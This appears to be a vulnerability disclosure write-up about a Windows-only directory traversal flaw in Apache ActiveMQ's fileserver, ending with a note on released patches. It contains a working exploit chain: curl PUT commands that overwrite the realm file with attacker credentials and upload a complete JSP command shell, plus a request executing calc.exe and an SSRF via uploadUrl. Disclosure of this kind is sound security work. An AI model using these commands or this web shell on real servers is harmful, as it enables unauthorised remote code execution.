@@ -1,0 +1,71 @@
+I have recently been playing with Apache ActiveMQ, and came across a simple but interesting directory traversal flaw in the fileserver upload/download functionality. 
+I have only been able to reproduce this on Windows, i.e. where "\" is a path delimiter. 
+An attacker could use this flaw to upload arbitrary files to the server, including a JSP shell, leading to remote code execution.
+
+Exploiting Windows systems to achieve RCE The default conf/jetty.xml includes:
+ <bean class="org.eclipse.jetty.security.ConstraintMapping" id="securityConstraintMapping">  
+     <property name="constraint" ref="securityConstraint">  
+     <property name="pathSpec" value="/api/*,/admin/*,*.jsp">  
+   </property></property>  
+ </bean>  
+Effectively blocking the upload of JSP files into contexts that will allow them to execute. 
+
+I imagine there are many ways around this; for my proof of concept I opted to overwrite conf/jetty-realm.properties and set my own credentials:
+
+$ cat jetty-realm.properties hacker: hacker, admin
+$ curl -v -X PUT --data "@jetty-realm.properties" http://TARGET:8161/fileserver/..\\conf\\jetty-realm.properties
+
+This seems to have the disadvantage of requiring a reboot of the server to take effect. 
+I am not sure if that is always the case, but if so, I'm pretty sure there is some other workaround that wouldn't require a reboot. 
+The attacker can then take a standard JSP shell:
+
+$ cat cmd.jsp 
+ <%@ page import="java.util.*,java.io.*"%>  
+ <%  
+ %>  
+ <HTML><BODY>  
+ Commands with JSP  
+ <FORM METHOD="GET" NAME="myform" ACTION="">  
+ <INPUT TYPE="text" NAME="cmd">  
+ <INPUT TYPE="submit" VALUE="Send">  
+ </FORM>  
+ <pre>  
+ <%  
+ if (request.getParameter("cmd") != null) {  
+ out.println("Command: " + request.getParameter("cmd") + "<BR>");  
+ Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));  
+ OutputStream os = p.getOutputStream();  
+ InputStream in = p.getInputStream();  
+ DataInputStream dis = new DataInputStream(in);  
+ String disr = dis.readLine();  
+ while ( disr != null ) {  
+ out.println(disr);  
+ disr = dis.readLine();  
+ }  
+ }  
+ %>  
+ </pre>  
+ </BODY></HTML>  
+
+Upload it, exploiting the "..\" directory traversal flaw to put it into an executable context:
+
+$ curl -u 'hacker:hacker' -v -X PUT --data "@cmd.jsp" http://TARGET:8161/fileserver/..\\admin\\cmd.jsp
+
+And pop a calc on the server:
+
+$ curl -u 'hacker:hacker' -v -X GET http://TARGET:8161/admin/cmd.jsp?cmd=calc.exe
+
+Exploiting non-Windows servers
+
+All attempts at directory traversal on a Linux system failed - encoded, double encoded, and UTF-8 encoded "../" were all caught by Jetty. Only "..\" worked. 
+That said, clients can specify the uploadUrl for a blob transfer, e.g.:
+
+tcp://localhost:61616?jms.blobTransferPolicy.uploadUrl=http://foo.com
+
+An attacker able to enqueue messages could use this to perform server side request forgery to an arbitrary uploadUrl target, even when running on non-Windows servers.
+
+Resolution
+
+The ActiveMQ project has released an advisory and patches. 
+This is not the first instance of such a flaw in an open source Java application; CVE-2014-7816 comes to mind. 
+It demonstrates that while Java may be platform independent, many developers are used to developing for a particular OS, and don't necessarily take cross-platform concerns into account.
